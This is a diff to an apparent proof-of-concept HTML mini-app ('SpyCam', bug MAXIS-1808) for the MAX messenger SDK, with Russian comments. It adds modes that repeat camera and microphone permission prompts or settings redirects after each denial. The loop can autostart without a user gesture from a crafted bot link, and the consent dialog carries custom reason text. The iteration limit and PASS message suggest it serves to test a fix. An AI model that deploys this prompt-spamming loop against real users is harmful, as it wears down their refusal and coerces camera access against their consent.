@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>SpyCam MiniApp (PoC MAXIS-1808)</title>
   <style>
@@ -45,19 +45,27 @@
   <div id="bridge-status" class="warn">bridge: загрузка SDK…</div>
 
   <button class="primary" onclick="capture()">Start Camera Capture with getUserMedia</button>
-  <button class="muted" onclick="RequestOnce()">Request Access to Camera stream</button>
+  <button class="muted" onclick="RequestOnce()">Single call (по выбранному методу)</button>
 
   <div class="card">
     <h2>Управление циклом (M-2)</h2>
-    <button class="primary" id="btn-start" onclick="startLoop()">Запустить цикл requestAccess</button>
+    <button class="primary" id="btn-start" onclick="startLoop()">Запустить цикл</button>
     <button class="danger" id="btn-stop" onclick="stopLoop()" disabled>Остановить</button>
+    <label>Метод спама
+      <select id="mode">
+        <option value="request" selected>requestAccess</option>
+        <option value="max">openMaxSettings</option>
+        <option value="sys">openSystemSettings</option>
+        <option value="alt">чередование requestAccess / openMaxSettings</option>
+      </select>
+    </label>
     <label>Пауза между запросами, мс (0 = сразу после ответа)
       <input type="text" id="delay" value="0" inputmode="numeric" />
     </label>
-    <label>reason (текст в диалоге согласия — вектор L-2)
+    <label>reason (текст в диалоге согласия — вектор L-2; только для requestAccess)
       <input type="text" id="reason" value="[PoC MAXIS-1808] Подтвердите доступ к камере для продолжения видеосвязи" />
     </label>
-    <label>Разрешения
+    <label>Разрешения (только для requestAccess)
       <select id="perms">
         <option value="camera" selected>camera</option>
         <option value="mic">mic</option>
@@ -111,16 +119,44 @@
       el.className = 'bad';
     }
   }
+
+  // ---- режимы ----
   // Автостарт может прийти двумя путями:
-  //  1) ?autostart=1 в query страницы (удобно при открытии напрямую);
+  //  1) ?autostart=1 / ?autostart=max / ?autostart=sys / ?autostart=alt в query страницы;
   //  2) стартовый параметр запуска — приходит в WebAppData (location hash),
-  //     SDK парсит его в initDataUnsafe.start_param
-  //     (запуск бота: https://max.ru/tostertostbot?startapp=autostart).
+  //     SDK парсит его в initDataUnsafe.start_param:
+  //     https://max.ru/tostertostbot?startapp=autostart | autostart-max | autostart-sys | autostart-alt
+  var AUTOSTART_MODES = {
+    'autostart': 'request', 'autostart-max': 'max', 'autostart-sys': 'sys', 'autostart-alt': 'alt',
+    '1': 'request', 'true': 'request'
+  };
+
+  function currentMode() { return document.getElementById('mode').value; }
+  function setMode(m) {
+    var sel = document.getElementById('mode');
+    for (var i = 0; i < sel.options.length; i++) {
+      if (sel.options[i].value === m) { sel.value = m; return; }
+    }
+  }
+
   function autostartSource() {
-    if (new URLSearchParams(location.search).get('autostart') === '1') return 'query';
+    var q = new URLSearchParams(location.search).get('autostart');
+    if (q) {
+      var key = q.replace(/=1$/, '');
+      if (AUTOSTART_MODES[key]) {
+        setMode(AUTOSTART_MODES[key]);
+        return 'query:"' + q + '"';
+      }
+    }
     var sdk = window.WebAppFull;
     var sp = sdk && sdk.initDataUnsafe && sdk.initDataUnsafe.start_param;
-    if (sp && /^(autostart(=1)?|1|true)$/.test(sp)) return 'start_param="' + sp + '"';
+    if (sp) {
+      var k = sp.replace(/=1$/, '');
+      if (AUTOSTART_MODES[k]) {
+        setMode(AUTOSTART_MODES[k]);
+        return 'start_param:"' + sp + '"';
+      }
+    }
     return null;
   }
 
@@ -128,7 +164,7 @@
     updateBridgeStatus();
     var src = autostartSource();
     if (src) {
-      log('autostart (' + src + '): запуск цикла requestAccess без user gesture…');
+      log('autostart (' + src + ', mode=' + currentMode() + '): запуск цикла без user gesture…');
       startLoop();
     }
   });
@@ -137,7 +173,7 @@
     // Фолбэк: если событие sdk-ready уже успело пройти мимо листенера
     var src = autostartSource();
     if (src && !running && !document.getElementById('btn-start').disabled) {
-      log('autostart (fallback, ' + src + '): запуск цикла requestAccess без user gesture…');
+      log('autostart (fallback, ' + src + ', mode=' + currentMode() + '): запуск цикла без user gesture…');
       startLoop();
     }
   }, 2500);
@@ -163,11 +199,19 @@
 
   var lastInitError = '';
 
-  // Настоящий отказ пользователя. Всё остальное (not_inited, not_found,
-  // request_timeout, not_supported, refused от toggle) — ошибки окружения:
-  // гонять по ним цикл бессмысленно, останавливаемся.
-  function isDenialCode(code) {
-    return /_permission_denied$/.test(String(code));
+  // Классификация кода ошибки:
+  //  'denied' — отказ ПОЛЬЗОВАТЕЛЯ (продолжаем цикл — это и есть M-2);
+  //  'already' — все доступы уже выданы (already_enabled), смысла дальше нет;
+  //  'env'     — ошибка окружения (not_inited / not_found / request_timeout /
+  //              not_supported / выключенный тоггл) — цикл останавливаем.
+  function classifyError(code) {
+    code = String(code);
+    if (/_permission_denied$/.test(code)) return 'denied';
+    if (/already_enabled$/.test(code)) return 'already';
+    // refused: в режимах настроек это отказ пользователя от перехода в настройки;
+    // в режиме requestAccess — выключенный фиче-тоггл (ошибка окружения)
+    if (/refused$/.test(code) && currentMode() !== 'request') return 'denied';
+    return 'env';
   }
 
   async function ensureInit(pm, attempts) {
@@ -192,50 +236,87 @@
     return 'См. код ошибки выше.';
   }
 
-  // ---- одиночный запрос ----
+  // Один вызов выбранного метода. Возвращает { outcome, code, res }:
+  //  granted  — доступ выдан (requestAccess);
+  //  opened   — пользователь перешёл в настройки (miniapp закроется);
+  //  already  — already_enabled;
+  //  denied   — отказ пользователя (продолжаем);
+  //  env      — ошибка окружения (стоп).
+  var altFlip = false;
+
+  async function callOnce(pm, reason) {
+    var mode = currentMode();
+    // в режиме 'alt' чередуем requestAccess и openMaxSettings
+    var useSettings = mode === 'max' || mode === 'sys' ||
+                      (mode === 'alt' && (altFlip = !altFlip));
+    try {
+      if (!useSettings) {
+        var res = await pm.requestAccess(permsArray(), reason);
+        var granted = res && (res.camera.appAccessGranted || res.mic.appAccessGranted);
+        return { outcome: granted ? 'granted' : 'denied', code: granted ? '' : 'no_access_in_response', res: res };
+      }
+      var r = (mode === 'sys') ? await pm.openSystemSettings() : await pm.openMaxSettings();
+      return { outcome: 'opened', code: '', res: r };
+    } catch (e) {
+      var code = errText(e);
+      return { outcome: classifyError(code), code: code, res: null };
+    }
+  }
+
+  // ---- одиночный вызов ----
   async function RequestOnce() {
     var pm = getPM();
     if (!pm) { log('bridge недоступен: SDK ещё не загружен или открыт вне клиента MAX'); return; }
     var reason = document.getElementById('reason').value || undefined;
     if (!await ensureInit(pm, 1)) { log('init() не удался: ' + initErrorHint()); return; }
     log('init() ok, camera.appAccessGranted=' + pm.isCameraAppAccessGranted);
-    try {
-      var res = await pm.requestAccess(permsArray(), reason);
-      log('requestAccess ok: ' + JSON.stringify(res));
-      document.getElementById('n-granted').textContent =
-        (res && (res.camera.appAccessGranted || res.mic.appAccessGranted)) ? 'выдан' : 'нет';
-    } catch (e) {
-      log('requestAccess отказ: ' + errText(e));
-    }
+    var r = await callOnce(pm, reason);
+    log('одиночный ' + currentMode() + ': outcome=' + r.outcome +
+        (r.code ? ' code=' + r.code : '') + ' ' + JSON.stringify(r.res));
   }
 
   // ---- цикл M-2: немедленный повтор после каждого отказа ----
+  var MAX_ITER = 200; // предохранитель: после фикса цикл будет крутиться вхолостую
+
   async function loop() {
     if (!running) return;
+    if (nIter >= MAX_ITER) {
+      log('Достигнут лимит ' + MAX_ITER + ' итераций — цикл остановлен. ' +
+          'Если ни одного диалога не показано — фикса M-2 работает (PASS).');
+      stopLoop();
+      return;
+    }
     nIter++; stat();
     var pm = getPM();
     var reason = document.getElementById('reason').value || undefined;
-    try {
-      var res = await pm.requestAccess(permsArray(), reason);
-      var granted = res && (res.camera.appAccessGranted || res.mic.appAccessGranted);
-      if (granted) {
-        document.getElementById('n-granted').textContent = 'выдан';
-        log('ИТЕРАЦИЯ ' + nIter + ': ДОСТУП ВЫДАН — цикл остановлен.');
-        stopLoop();
-        return;
-      }
-      nDenied++; stat();
-      log('ИТЕРАЦИЯ ' + nIter + ': ответ без доступа → повторный запрос.');
-    } catch (e) {
-      var code = errText(e);
-      if (!isDenialCode(code)) {
-        log('ИТЕРАЦИЯ ' + nIter + ': ошибка окружения (' + code + ') — НЕ отказ пользователя, цикл остановлен.');
-        stopLoop();
-        return;
-      }
-      nDenied++; stat();
-      log('ИТЕРАЦИЯ ' + nIter + ': отказ (' + code + ') → повторный запрос.');
+    var r = await callOnce(pm, reason);
+
+    if (r.outcome === 'granted') {
+      document.getElementById('n-granted').textContent = 'выдан';
+      log('ИТЕРАЦИЯ ' + nIter + ': ДОСТУП ВЫДАН — цикл остановлен.');
+      stopLoop();
+      return;
     }
+    if (r.outcome === 'opened') {
+      log('ИТЕРАЦИЯ ' + nIter + ': пользователь перешёл в настройки — мини-апп закроется, цикл остановлен.');
+      stopLoop();
+      return;
+    }
+    if (r.outcome === 'already') {
+      document.getElementById('n-granted').textContent = 'выдан';
+      log('ИТЕРАЦИЯ ' + nIter + ': already_enabled — все доступы уже выданы, цикл остановлен.');
+      stopLoop();
+      return;
+    }
+    if (r.outcome === 'denied') {
+      nDenied++; stat();
+      log('ИТЕРАЦИЯ ' + nIter + ': отказ (' + (r.code || 'без кода') + ') → повторный запрос.');
+    } else {
+      log('ИТЕРАЦИЯ ' + nIter + ': ошибка окружения (' + r.code + ') — НЕ отказ пользователя, цикл остановлен.');
+      stopLoop();
+      return;
+    }
+
     var d = parseInt(document.getElementById('delay').value, 10) || 0;
     await sleep(d);
     loop();
@@ -249,14 +330,15 @@
     var sdk = window.WebAppFull;
     log('platform=' + (sdk.platform || '?') +
         ', query_id=' + (sdk.initDataUnsafe && sdk.initDataUnsafe.query_id ? 'есть' : 'ОТСУТСТВУЕТ') +
-        ', start_param=' + JSON.stringify((sdk.initDataUnsafe && sdk.initDataUnsafe.start_param) || null));
+        ', start_param=' + JSON.stringify((sdk.initDataUnsafe && sdk.initDataUnsafe.start_param) || null) +
+        ', mode=' + currentMode());
 
-    // Без успешного init() цикл не запускаем: requestAccess без него всегда not_inited
+    // Без успешного init() цикл не запускаем: методы без него всегда not_inited
     if (!await ensureInit(pm, 3)) {
       log('init() не удался — цикл НЕ запущен. ' + initErrorHint());
       return;
     }
-    log('init() ok. Старт цикла: жмите «Отмена» в шите согласия.');
+    log('init() ok. Старт цикла (' + currentMode() + '): жмите «Отмена» в диалогах.');
     running = true;
     document.getElementById('btn-start').disabled = true;
     document.getElementById('btn-stop').disabled = false;
